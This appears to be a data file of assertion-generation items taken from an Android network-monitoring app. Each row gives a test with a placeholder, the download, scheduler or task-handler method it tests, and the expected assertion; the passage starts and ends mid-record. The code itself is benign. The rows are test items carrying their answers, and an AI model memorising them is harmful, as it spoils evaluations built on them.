wakeLock.acquire(wakeLockTimeout); TimeBasedSuspensionScheduler timeBasedScheduler = createTimeBasedSuspensionScheduler(context); synchronized (TimeBasedSuspensionScheduler.LOCK) { if (timeBasedScheduler.isRunning()) { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Time based scheduler is running.""); if (!timeBasedScheduler.isSuspended()) { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Time based scheduler is not suspended.""); executeAndReschedule(context, task, wakeLock, synchronous, addToPool, executorService); } else { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Time based scheduler is suspended. Skipping execution and rescheduling.""); } } else { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Time based scheduler is not running.""); if (!timeBasedScheduler.isSuspensionActiveAndEnabled()) { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Time based scheduler is not active.""); executeAndReschedule(context, task, wakeLock, synchronous, addToPool, executorService); } else { Log.e(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Time based scheduler is not running but is active. Restarting...""); timeBasedScheduler.start(task); } } } } catch (Exception exc) { Log.e(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Error executing worker"", exc); } finally { if (wakeLock != null && synchronous && wakeLock.isHeld()) { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Releasing partial wake lock""); wakeLock.release(); } Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Shutting down ExecutorService""); executorService.shutdown(); } }"	assertEquals(0, entries.size())
"testExecutionSkippedNotValid() { NetworkTask task = getNetworkTask(); task = networkTaskDAO.insertNetworkTask(task); networkTaskDAO.updateNetworkTaskRunning(task.getId(), true); task.setSchedulerId(task.getSchedulerId() + 1); Intent intent = new Intent(); intent.putExtras(task.toBundle()); broadcastReceiver.onReceive(TestRegistry.getContext(), intent); List<LogEntry> entries = logDAO.readAllLogsForNetworkTask(task.getId()); ""<AssertPlaceHolder>""; }
onReceive(Context context, Intent intent) { NetworkTask task = new NetworkTask(Objects.requireNonNull(intent.getExtras())); Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Received request for "" + task); boolean synchronous = context.getResources().getBoolean(R.bool.worker_synchronous_execution); boolean addToPool = context.getResources().getBoolean(R.bool.worker_add_to_pool); int wakeLockTimeout = context.getResources().getInteger(R.integer.worker_execution_wakelock_timeout) * 1000; Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Synchronous execution is "" + synchronous); PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE); PowerManager.WakeLock wakeLock = null; Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Creating ExecutorService""); ExecutorService executorService = Executors.newSingleThreadExecutor(); try { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Acquiring partial wake lock with a timeout of "" + wakeLockTimeout + "" msec""); wakeLock = Objects.requireNonNull(powerManager).newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, ""KeepItUp:NetworkTaskProcessBroadcastReceiver""); wakeLock.acquire(wakeLockTimeout); TimeBasedSuspensionScheduler timeBasedScheduler = createTimeBasedSuspensionScheduler(context); synchronized (TimeBasedSuspensionScheduler.LOCK) { if (timeBasedScheduler.isRunning()) { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Time based scheduler is running.""); if (!timeBasedScheduler.isSuspended()) { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Time based scheduler is not suspended.""); executeAndReschedule(context, task, wakeLock, synchronous, addToPool, executorService); } else { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Time based scheduler is suspended. Skipping execution and rescheduling.""); } } else { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Time based scheduler is not running.""); if (!timeBasedScheduler.isSuspensionActiveAndEnabled()) { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Time based scheduler is not active.""); executeAndReschedule(context, task, wakeLock, synchronous, addToPool, executorService); } else { Log.e(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Time based scheduler is not running but is active. Restarting...""); timeBasedScheduler.start(task); } } } } catch (Exception exc) { Log.e(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Error executing worker"", exc); } finally { if (wakeLock != null && synchronous && wakeLock.isHeld()) { Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Releasing partial wake lock""); wakeLock.release(); } Log.d(NetworkTaskProcessBroadcastReceiver.class.getName(), ""Shutting down ExecutorService""); executorService.shutdown(); } }"	assertEquals(0, entries.size())
"testConnectionFailedNegativeTime() { TestDownloadCommand downloadCommand = new TestDownloadCommand(TestRegistry.getContext(), null, null, null, true); setNegativeTime(downloadCommand); DownloadCommandResult result = downloadCommand.call(); ""<AssertPlaceHolder>""; }
call() { Log.d(DownloadCommand.class.getName(), ""call""); URLConnection connection = null; InputStream inputStream = null; FileOutputStream outputStream = null; boolean connectSuccess = false; boolean downloadSuccess = false; boolean fileExists; boolean deleteSuccess = false; int httpCode = -1; String httpMessage = null; String fileName = null; ScheduledExecutorService executorService = Executors.newSingleThreadScheduledExecutor(); initializeValid(); long start = timeService.getCurrentTimestamp(); try { Log.d(DownloadCommand.class.getName(), ""Establishing connection to "" + url); connection = openConnection(); if (connection == null) { Log.d(DownloadCommand.class.getName(), ""Error establishing connection to "" + url); long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(false, false, false, false, httpCode, null, null, NumberUtil.ensurePositive(end - start), null); } connectSuccess = true; Log.d(DownloadCommand.class.getName(), ""Connection established.""); if (HTTPUtil.isHTTPConnection(connection)) { Log.d(DownloadCommand.class.getName(), ""Download is an HTTP download.""); HttpURLConnection httpConnection = (HttpURLConnection) connection; httpCode = httpConnection.getResponseCode(); Log.d(DownloadCommand.class.getName(), ""HTTP return code is "" + httpCode); httpMessage = httpConnection.getResponseMessage(); httpMessage += getLocationHeader(connection); Log.d(DownloadCommand.class.getName(), ""HTTP message is "" + httpMessage); if (!HTTPUtil.isHTTPReturnCodeOk(httpCode)) { Log.d(DownloadCommand.class.getName(), ""Connection successful but HTTP return code "" + httpCode + "" is not HTTP_OK""); long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(true, false, false, false, httpCode, httpMessage, null, NumberUtil.ensurePositive(end - start), null); } } else { Log.d(DownloadCommand.class.getName(), ""Download is not an HTTP download.""); } fileName = getFileName(connection); if (fileName == null) { Log.d(DownloadCommand.class.getName(), ""Connection successful but download file name could not be determined""); long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(true, false, false, false, httpCode, httpMessage, null, NumberUtil.ensurePositive(end - start), null); } Log.d(DownloadCommand.class.getName(), ""Using file name "" + fileName); Log.d(DownloadCommand.class.getName(), ""Opening streams...""); inputStream = connection.getInputStream(); outputStream = getOutputStream(fileName); int pollInterval = getResources().getInteger(R.integer.download_valid_poll_interval); Log.d(DownloadCommand.class.getName(), ""Scheduling verify valid polling thread with an interval of "" + pollInterval); executorService.scheduleWithFixedDelay(this::verifyValid, 0, pollInterval, TimeUnit.SECONDS); Log.d(DownloadCommand.class.getName(), ""Starting download...""); downloadSuccess = StreamUtil.inputStreamToOutputStream(inputStream, outputStream, this::isValid); Log.d(DownloadCommand.class.getName(), ""Download successful: "" + downloadSuccess); flushAndCloseOutputStream(outputStream); fileExists = downloadedFileExists(fileName); Log.d(DownloadCommand.class.getName(), ""Partial download successful: "" + fileExists); if (delete && fileExists) { Log.d(DownloadCommand.class.getName(), ""Deleting downloaded file...""); deleteSuccess = deleteDownloadedFile(fileName); } long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(true, downloadSuccess, fileExists, deleteSuccess, httpCode, httpMessage, fileName, NumberUtil.ensurePositive(end - start), null); } catch (Exception exc) { Log.e(DownloadCommand.class.getName(), ""Error executing download command"", exc); Log.e(DownloadCommand.class.getName(), ""Try closing stream.""); flushAndCloseOutputStream(outputStream); fileExists = downloadedFileExists(fileName); Log.d(DownloadCommand.class.getName(), ""Partial download successful: "" + fileExists); if (delete && fileExists) { Log.d(DownloadCommand.class.getName(), ""Deleting downloaded file...""); deleteSuccess = deleteDownloadedFile(fileName); } long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(connectSuccess, downloadSuccess, fileExists, deleteSuccess, httpCode, httpMessage, fileName, NumberUtil.ensurePositive(end - start), exc); } finally { closeResources(connection, inputStream, outputStream, executorService); } }"	assertEquals(0, result.duration())
"Exception { TestDownloadCommand downloadCommand = new TestDownloadCommand(TestRegistry.getContext(), null, null, null, true); setNegativeTime(downloadCommand); MockHttpURLConnection urlConnection = prepareHttpURLConnection(HttpURLConnection.HTTP_NOT_FOUND, ""not found"", null); downloadCommand.setURLConnection(urlConnection); DownloadCommandResult result = downloadCommand.call(); ""<AssertPlaceHolder>""; }
call() { Log.d(DownloadCommand.class.getName(), ""call""); URLConnection connection = null; InputStream inputStream = null; FileOutputStream outputStream = null; boolean connectSuccess = false; boolean downloadSuccess = false; boolean fileExists; boolean deleteSuccess = false; int httpCode = -1; String httpMessage = null; String fileName = null; ScheduledExecutorService executorService = Executors.newSingleThreadScheduledExecutor(); initializeValid(); long start = timeService.getCurrentTimestamp(); try { Log.d(DownloadCommand.class.getName(), ""Establishing connection to "" + url); connection = openConnection(); if (connection == null) { Log.d(DownloadCommand.class.getName(), ""Error establishing connection to "" + url); long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(false, false, false, false, httpCode, null, null, NumberUtil.ensurePositive(end - start), null); } connectSuccess = true; Log.d(DownloadCommand.class.getName(), ""Connection established.""); if (HTTPUtil.isHTTPConnection(connection)) { Log.d(DownloadCommand.class.getName(), ""Download is an HTTP download.""); HttpURLConnection httpConnection = (HttpURLConnection) connection; httpCode = httpConnection.getResponseCode(); Log.d(DownloadCommand.class.getName(), ""HTTP return code is "" + httpCode); httpMessage = httpConnection.getResponseMessage(); httpMessage += getLocationHeader(connection); Log.d(DownloadCommand.class.getName(), ""HTTP message is "" + httpMessage); if (!HTTPUtil.isHTTPReturnCodeOk(httpCode)) { Log.d(DownloadCommand.class.getName(), ""Connection successful but HTTP return code "" + httpCode + "" is not HTTP_OK""); long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(true, false, false, false, httpCode, httpMessage, null, NumberUtil.ensurePositive(end - start), null); } } else { Log.d(DownloadCommand.class.getName(), ""Download is not an HTTP download.""); } fileName = getFileName(connection); if (fileName == null) { Log.d(DownloadCommand.class.getName(), ""Connection successful but download file name could not be determined""); long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(true, false, false, false, httpCode, httpMessage, null, NumberUtil.ensurePositive(end - start), null); } Log.d(DownloadCommand.class.getName(), ""Using file name "" + fileName); Log.d(DownloadCommand.class.getName(), ""Opening streams...""); inputStream = connection.getInputStream(); outputStream = getOutputStream(fileName); int pollInterval = getResources().getInteger(R.integer.download_valid_poll_interval); Log.d(DownloadCommand.class.getName(), ""Scheduling verify valid polling thread with an interval of "" + pollInterval); executorService.scheduleWithFixedDelay(this::verifyValid, 0, pollInterval, TimeUnit.SECONDS); Log.d(DownloadCommand.class.getName(), ""Starting download...""); downloadSuccess = StreamUtil.inputStreamToOutputStream(inputStream, outputStream, this::isValid); Log.d(DownloadCommand.class.getName(), ""Download successful: "" + downloadSuccess); flushAndCloseOutputStream(outputStream); fileExists = downloadedFileExists(fileName); Log.d(DownloadCommand.class.getName(), ""Partial download successful: "" + fileExists); if (delete && fileExists) { Log.d(DownloadCommand.class.getName(), ""Deleting downloaded file...""); deleteSuccess = deleteDownloadedFile(fileName); } long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(true, downloadSuccess, fileExists, deleteSuccess, httpCode, httpMessage, fileName, NumberUtil.ensurePositive(end - start), null); } catch (Exception exc) { Log.e(DownloadCommand.class.getName(), ""Error executing download command"", exc); Log.e(DownloadCommand.class.getName(), ""Try closing stream.""); flushAndCloseOutputStream(outputStream); fileExists = downloadedFileExists(fileName); Log.d(DownloadCommand.class.getName(), ""Partial download successful: "" + fileExists); if (delete && fileExists) { Log.d(DownloadCommand.class.getName(), ""Deleting downloaded file...""); deleteSuccess = deleteDownloadedFile(fileName); } long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(connectSuccess, downloadSuccess, fileExists, deleteSuccess, httpCode, httpMessage, fileName, NumberUtil.ensurePositive(end - start), exc); } finally { closeResources(connection, inputStream, outputStream, executorService); } }"	assertEquals(0, result.duration())
"Exception { File externalDir = fileManager.getExternalDirectory(fileManager.getDefaultDownloadDirectoryName(), 0); TestDownloadCommand downloadCommand = new TestDownloadCommand(TestRegistry.getContext(), null, null, externalDir, true); setNegativeTime(downloadCommand); MockHttpURLConnection urlConnection = prepareHttpURLConnection(null); downloadCommand.setURLConnection(urlConnection); urlConnection.setExceptionOnInputStream(new IOException(""Test"")); urlConnection.addHeader(""Content-Disposition"", ""attachment; filename=""test.jpg""""); DownloadCommandResult result = downloadCommand.call(); ""<AssertPlaceHolder>""; }
call() { Log.d(DownloadCommand.class.getName(), ""call""); URLConnection connection = null; InputStream inputStream = null; FileOutputStream outputStream = null; boolean connectSuccess = false; boolean downloadSuccess = false; boolean fileExists; boolean deleteSuccess = false; int httpCode = -1; String httpMessage = null; String fileName = null; ScheduledExecutorService executorService = Executors.newSingleThreadScheduledExecutor(); initializeValid(); long start = timeService.getCurrentTimestamp(); try { Log.d(DownloadCommand.class.getName(), ""Establishing connection to "" + url); connection = openConnection(); if (connection == null) { Log.d(DownloadCommand.class.getName(), ""Error establishing connection to "" + url); long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(false, false, false, false, httpCode, null, null, NumberUtil.ensurePositive(end - start), null); } connectSuccess = true; Log.d(DownloadCommand.class.getName(), ""Connection established.""); if (HTTPUtil.isHTTPConnection(connection)) { Log.d(DownloadCommand.class.getName(), ""Download is an HTTP download.""); HttpURLConnection httpConnection = (HttpURLConnection) connection; httpCode = httpConnection.getResponseCode(); Log.d(DownloadCommand.class.getName(), ""HTTP return code is "" + httpCode); httpMessage = httpConnection.getResponseMessage(); httpMessage += getLocationHeader(connection); Log.d(DownloadCommand.class.getName(), ""HTTP message is "" + httpMessage); if (!HTTPUtil.isHTTPReturnCodeOk(httpCode)) { Log.d(DownloadCommand.class.getName(), ""Connection successful but HTTP return code "" + httpCode + "" is not HTTP_OK""); long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(true, false, false, false, httpCode, httpMessage, null, NumberUtil.ensurePositive(end - start), null); } } else { Log.d(DownloadCommand.class.getName(), ""Download is not an HTTP download.""); } fileName = getFileName(connection); if (fileName == null) { Log.d(DownloadCommand.class.getName(), ""Connection successful but download file name could not be determined""); long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(true, false, false, false, httpCode, httpMessage, null, NumberUtil.ensurePositive(end - start), null); } Log.d(DownloadCommand.class.getName(), ""Using file name "" + fileName); Log.d(DownloadCommand.class.getName(), ""Opening streams...""); inputStream = connection.getInputStream(); outputStream = getOutputStream(fileName); int pollInterval = getResources().getInteger(R.integer.download_valid_poll_interval); Log.d(DownloadCommand.class.getName(), ""Scheduling verify valid polling thread with an interval of "" + pollInterval); executorService.scheduleWithFixedDelay(this::verifyValid, 0, pollInterval, TimeUnit.SECONDS); Log.d(DownloadCommand.class.getName(), ""Starting download...""); downloadSuccess = StreamUtil.inputStreamToOutputStream(inputStream, outputStream, this::isValid); Log.d(DownloadCommand.class.getName(), ""Download successful: "" + downloadSuccess); flushAndCloseOutputStream(outputStream); fileExists = downloadedFileExists(fileName); Log.d(DownloadCommand.class.getName(), ""Partial download successful: "" + fileExists); if (delete && fileExists) { Log.d(DownloadCommand.class.getName(), ""Deleting downloaded file...""); deleteSuccess = deleteDownloadedFile(fileName); } long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(true, downloadSuccess, fileExists, deleteSuccess, httpCode, httpMessage, fileName, NumberUtil.ensurePositive(end - start), null); } catch (Exception exc) { Log.e(DownloadCommand.class.getName(), ""Error executing download command"", exc); Log.e(DownloadCommand.class.getName(), ""Try closing stream.""); flushAndCloseOutputStream(outputStream); fileExists = downloadedFileExists(fileName); Log.d(DownloadCommand.class.getName(), ""Partial download successful: "" + fileExists); if (delete && fileExists) { Log.d(DownloadCommand.class.getName(), ""Deleting downloaded file...""); deleteSuccess = deleteDownloadedFile(fileName); } long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(connectSuccess, downloadSuccess, fileExists, deleteSuccess, httpCode, httpMessage, fileName, NumberUtil.ensurePositive(end - start), exc); } finally { closeResources(connection, inputStream, outputStream, executorService); } }"	assertEquals(0, result.duration())
"Exception { File externalDir = fileManager.getExternalDirectory(fileManager.getDefaultDownloadDirectoryName(), 0); TestDownloadCommand downloadCommand = new TestDownloadCommand(TestRegistry.getContext(), null, new URL(""http://www.host.com""), externalDir, true); setNegativeTime(downloadCommand); MockHttpURLConnection urlConnection = prepareHttpURLConnection(null); downloadCommand.setURLConnection(urlConnection); urlConnection.setExceptionOnInputStream(new IOException(""Test"")); urlConnection.setContentType(""image/jpeg""); DownloadCommandResult result = downloadCommand.call(); ""<AssertPlaceHolder>""; }
call() { Log.d(DownloadCommand.class.getName(), ""call""); URLConnection connection = null; InputStream inputStream = null; FileOutputStream outputStream = null; boolean connectSuccess = false; boolean downloadSuccess = false; boolean fileExists; boolean deleteSuccess = false; int httpCode = -1; String httpMessage = null; String fileName = null; ScheduledExecutorService executorService = Executors.newSingleThreadScheduledExecutor(); initializeValid(); long start = timeService.getCurrentTimestamp(); try { Log.d(DownloadCommand.class.getName(), ""Establishing connection to "" + url); connection = openConnection(); if (connection == null) { Log.d(DownloadCommand.class.getName(), ""Error establishing connection to "" + url); long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(false, false, false, false, httpCode, null, null, NumberUtil.ensurePositive(end - start), null); } connectSuccess = true; Log.d(DownloadCommand.class.getName(), ""Connection established.""); if (HTTPUtil.isHTTPConnection(connection)) { Log.d(DownloadCommand.class.getName(), ""Download is an HTTP download.""); HttpURLConnection httpConnection = (HttpURLConnection) connection; httpCode = httpConnection.getResponseCode(); Log.d(DownloadCommand.class.getName(), ""HTTP return code is "" + httpCode); httpMessage = httpConnection.getResponseMessage(); httpMessage += getLocationHeader(connection); Log.d(DownloadCommand.class.getName(), ""HTTP message is "" + httpMessage); if (!HTTPUtil.isHTTPReturnCodeOk(httpCode)) { Log.d(DownloadCommand.class.getName(), ""Connection successful but HTTP return code "" + httpCode + "" is not HTTP_OK""); long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(true, false, false, false, httpCode, httpMessage, null, NumberUtil.ensurePositive(end - start), null); } } else { Log.d(DownloadCommand.class.getName(), ""Download is not an HTTP download.""); } fileName = getFileName(connection); if (fileName == null) { Log.d(DownloadCommand.class.getName(), ""Connection successful but download file name could not be determined""); long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(true, false, false, false, httpCode, httpMessage, null, NumberUtil.ensurePositive(end - start), null); } Log.d(DownloadCommand.class.getName(), ""Using file name "" + fileName); Log.d(DownloadCommand.class.getName(), ""Opening streams...""); inputStream = connection.getInputStream(); outputStream = getOutputStream(fileName); int pollInterval = getResources().getInteger(R.integer.download_valid_poll_interval); Log.d(DownloadCommand.class.getName(), ""Scheduling verify valid polling thread with an interval of "" + pollInterval); executorService.scheduleWithFixedDelay(this::verifyValid, 0, pollInterval, TimeUnit.SECONDS); Log.d(DownloadCommand.class.getName(), ""Starting download...""); downloadSuccess = StreamUtil.inputStreamToOutputStream(inputStream, outputStream, this::isValid); Log.d(DownloadCommand.class.getName(), ""Download successful: "" + downloadSuccess); flushAndCloseOutputStream(outputStream); fileExists = downloadedFileExists(fileName); Log.d(DownloadCommand.class.getName(), ""Partial download successful: "" + fileExists); if (delete && fileExists) { Log.d(DownloadCommand.class.getName(), ""Deleting downloaded file...""); deleteSuccess = deleteDownloadedFile(fileName); } long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(true, downloadSuccess, fileExists, deleteSuccess, httpCode, httpMessage, fileName, NumberUtil.ensurePositive(end - start), null); } catch (Exception exc) { Log.e(DownloadCommand.class.getName(), ""Error executing download command"", exc); Log.e(DownloadCommand.class.getName(), ""Try closing stream.""); flushAndCloseOutputStream(outputStream); fileExists = downloadedFileExists(fileName); Log.d(DownloadCommand.class.getName(), ""Partial download successful: "" + fileExists); if (delete && fileExists) { Log.d(DownloadCommand.class.getName(), ""Deleting downloaded file...""); deleteSuccess = deleteDownloadedFile(fileName); } long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(connectSuccess, downloadSuccess, fileExists, deleteSuccess, httpCode, httpMessage, fileName, NumberUtil.ensurePositive(end - start), exc); } finally { closeResources(connection, inputStream, outputStream, executorService); } }"	assertEquals(0, result.duration())
"Exception { NetworkTask task = networkTaskDAO.insertNetworkTask(getNetworkTask()); File externalDir = fileManager.getExternalDirectory(fileManager.getDefaultDownloadDirectoryName(), 0); TestDownloadCommand downloadCommand = new TestDownloadCommand(TestRegistry.getContext(), task, null, externalDir, true); setNegativeTime(downloadCommand); ByteArrayInputStream inputStream = new ByteArrayInputStream(""TestData"".getBytes(Charsets.UTF_8)); MockHttpURLConnection urlConnection = prepareHttpURLConnection(inputStream); downloadCommand.setURLConnection(urlConnection); MockFileManager fileManager = new MockFileManager(); fileManager.setDownloadFileName(""test.txt""); fileManager.setValidFileName(""test.txt""); fileManager.setDelete(false); downloadCommand.setFileManager(fileManager); DownloadCommandResult result = downloadCommand.call(); ""<AssertPlaceHolder>""; }
call() { Log.d(DownloadCommand.class.getName(), ""call""); URLConnection connection = null; InputStream inputStream = null; FileOutputStream outputStream = null; boolean connectSuccess = false; boolean downloadSuccess = false; boolean fileExists; boolean deleteSuccess = false; int httpCode = -1; String httpMessage = null; String fileName = null; ScheduledExecutorService executorService = Executors.newSingleThreadScheduledExecutor(); initializeValid(); long start = timeService.getCurrentTimestamp(); try { Log.d(DownloadCommand.class.getName(), ""Establishing connection to "" + url); connection = openConnection(); if (connection == null) { Log.d(DownloadCommand.class.getName(), ""Error establishing connection to "" + url); long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(false, false, false, false, httpCode, null, null, NumberUtil.ensurePositive(end - start), null); } connectSuccess = true; Log.d(DownloadCommand.class.getName(), ""Connection established.""); if (HTTPUtil.isHTTPConnection(connection)) { Log.d(DownloadCommand.class.getName(), ""Download is an HTTP download.""); HttpURLConnection httpConnection = (HttpURLConnection) connection; httpCode = httpConnection.getResponseCode(); Log.d(DownloadCommand.class.getName(), ""HTTP return code is "" + httpCode); httpMessage = httpConnection.getResponseMessage(); httpMessage += getLocationHeader(connection); Log.d(DownloadCommand.class.getName(), ""HTTP message is "" + httpMessage); if (!HTTPUtil.isHTTPReturnCodeOk(httpCode)) { Log.d(DownloadCommand.class.getName(), ""Connection successful but HTTP return code "" + httpCode + "" is not HTTP_OK""); long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(true, false, false, false, httpCode, httpMessage, null, NumberUtil.ensurePositive(end - start), null); } } else { Log.d(DownloadCommand.class.getName(), ""Download is not an HTTP download.""); } fileName = getFileName(connection); if (fileName == null) { Log.d(DownloadCommand.class.getName(), ""Connection successful but download file name could not be determined""); long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(true, false, false, false, httpCode, httpMessage, null, NumberUtil.ensurePositive(end - start), null); } Log.d(DownloadCommand.class.getName(), ""Using file name "" + fileName); Log.d(DownloadCommand.class.getName(), ""Opening streams...""); inputStream = connection.getInputStream(); outputStream = getOutputStream(fileName); int pollInterval = getResources().getInteger(R.integer.download_valid_poll_interval); Log.d(DownloadCommand.class.getName(), ""Scheduling verify valid polling thread with an interval of "" + pollInterval); executorService.scheduleWithFixedDelay(this::verifyValid, 0, pollInterval, TimeUnit.SECONDS); Log.d(DownloadCommand.class.getName(), ""Starting download...""); downloadSuccess = StreamUtil.inputStreamToOutputStream(inputStream, outputStream, this::isValid); Log.d(DownloadCommand.class.getName(), ""Download successful: "" + downloadSuccess); flushAndCloseOutputStream(outputStream); fileExists = downloadedFileExists(fileName); Log.d(DownloadCommand.class.getName(), ""Partial download successful: "" + fileExists); if (delete && fileExists) { Log.d(DownloadCommand.class.getName(), ""Deleting downloaded file...""); deleteSuccess = deleteDownloadedFile(fileName); } long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(true, downloadSuccess, fileExists, deleteSuccess, httpCode, httpMessage, fileName, NumberUtil.ensurePositive(end - start), null); } catch (Exception exc) { Log.e(DownloadCommand.class.getName(), ""Error executing download command"", exc); Log.e(DownloadCommand.class.getName(), ""Try closing stream.""); flushAndCloseOutputStream(outputStream); fileExists = downloadedFileExists(fileName); Log.d(DownloadCommand.class.getName(), ""Partial download successful: "" + fileExists); if (delete && fileExists) { Log.d(DownloadCommand.class.getName(), ""Deleting downloaded file...""); deleteSuccess = deleteDownloadedFile(fileName); } long end = timeService.getCurrentTimestamp(); return createDownloadCommandResult(connectSuccess, downloadSuccess, fileExists, deleteSuccess, httpCode, httpMessage, fileName, NumberUtil.ensurePositive(end - start), exc); } finally { closeResources(connection, inputStream, outputStream, executorService); } }"	assertEquals(0, result.duration())
"testUpdateNetworkTaskClearNetworkTaskLog() { NetworkTask task1 = getNetworkTask1(); AccessTypeData data1 = getAccessTypeData1(); handler.insertNetworkTask(task1, data1); task1.setAddress(""192.168.178.1""); ILogger logger = NetworkTaskLog.getLogger(TestRegistry.getContext(), task1); handler.updateNetworkTask(task1, data1); ILogger logger2 = NetworkTaskLog.getLogger(TestRegistry.getContext(), task1); ""<AssertPlaceHolder>""; }
updateNetworkTask(NetworkTask task, AccessTypeData data) { Log.d(NetworkTaskHandler.class.getName(), ""updateNetworkTask for task "" + task + "" and access type data "" + data); try { boolean running = task.isRunning(); if (running) { Log.d(NetworkTaskHandler.class.getName(), ""Network task is running. Cancelling.""); task = scheduler.cancel(task); } NetworkTaskDAO networkTaskDAO = new NetworkTaskDAO(mainActivity); task = networkTaskDAO.updateNetworkTask(task); if (task.getSchedulerId() == SchedulerIdGenerator.ERROR_SCHEDULER_ID) { Log.e(NetworkTaskHandler.class.getName(), ""Error updating task. Showing error dialog.""); mainActivity.showErrorDialog(getResources().getString(R.string.text_dialog_general_error_update_network_task)); return; } AccessTypeDataDAO accessTypeDataDAO = new AccessTypeDataDAO(mainActivity); data.setNetworkTaskId(task.getId()); data = accessTypeDataDAO.updateAccessTypeData(data); if (running) { Log.d(NetworkTaskHandler.class.getName(), ""Network task is running. Restarting.""); task = scheduler.start(task); } getAdapter().replaceNetworkTask(task, data); } catch (Exception exc) { Log.e(NetworkTaskHandler.class.getName(), ""Error updating task. Showing error dialog."", exc); showErrorDialog(getResources().getString(R.string.text_dialog_general_error_update_network_task)); } finally { NetworkTaskLog.clear(); } }"	assertNotSame(logger, logger2)
"testDeleteNetworkTaskClearNetworkTaskLog() { NetworkTask task1 = getNetworkTask1(); AccessTypeData data1 = getAccessTypeData1(); handler.insertNetworkTask(task1, data1); ILogger logger = NetworkTaskLog.getLogger(TestRegistry.getContext(), task1); handler.deleteNetworkTask(task1); ILogger logger2 = NetworkTaskLog.getLogger(TestRegistry.getContext(), task1); ""<AssertPlaceHolder>""; }
deleteNetworkTask(NetworkTask task) { Log.d(NetworkTaskHandler.class.getName(), ""deleteNetworkTask for task "" + task); try { NetworkTaskDAO networkTaskDAO = new NetworkTaskDAO(mainActivity); AccessTypeDataDAO accessTypeDataDAO = new AccessTypeDataDAO(mainActivity); LogDAO logDAO = new LogDAO(mainActivity); if (task.isRunning()) { Log.d(NetworkTaskHandler.class.getName(), ""Network task is running. Stopping.""); task = scheduler.cancel(task); } logDAO.deleteAllLogsForNetworkTask(task.getId()); accessTypeDataDAO.deleteAccessTypeDataForNetworkTask(task.getId()); networkTaskDAO.deleteNetworkTask(task); getAdapter().removeItem(new NetworkTaskUIWrapper(task, null, null)); } catch (Exception exc) { Log.e(NetworkTaskHandler.class.getName(), ""Error deleting network task."", exc); showErrorDialog(getResources().getString(R.string.text_dialog_general_error_delete_network_task)); } finally { NetworkTaskLog.clear(); } }"	assertNotSame(logger, logger2)
"testEditNetworkTaskValueNotChanged() { ActivityScenario<?> activityScenario = launchRecyclerViewBaseActivity(NetworkTaskMainActivity.class); injectPermissionManager(activityScenario); onView(allOf(withId(R.id.imageview_activity_main_network_task_add), isDisplayed())).perform(click()); onView(withId(R.id.imageview_dialog_network_task_edit_ok)).perform(click()); NetworkTask taskBefore = getNetworkTaskDAO().readAllNetworkTasks().get(0); onView(allOf(withId(R.id.imageview_list_item_network_task_edit), withChildDescendantAtPosition(withId(R.id.listview_activity_main_network_tasks), 0))).perform(click()); onView(withId(R.id.imageview_dialog_network_task_edit_ok)).perform(click()); NetworkTask taskAfter = getNetworkTaskDAO().readAllNetworkTasks().get(0); ""<AssertPlaceHolder>""; activityScenario.close(); }
injectPermissionManager(IPermissionManager permissionManager) { this.permissionManager = permissionManager; }"	assertTrue(taskBefore.isEqual(taskAfter))
"testCancel() { TestContextOptionsDialog contextOptionsDialog = openTestContextOptionDialog(Arrays.asList(ContextOption.COPY.name(), ContextOption.PASTE.name())); onView(withId(R.id.listview_dialog_context_options)).check(matches(withListSize(2))); onView(withId(R.id.imageview_dialog_context_options_cancel)).perform(click()); TestContextOptionsSupport testContextOptionsSupport = (TestContextOptionsSupport) contextOptionsDialog.getContextOptionsSupport(); ""<AssertPlaceHolder>""; }
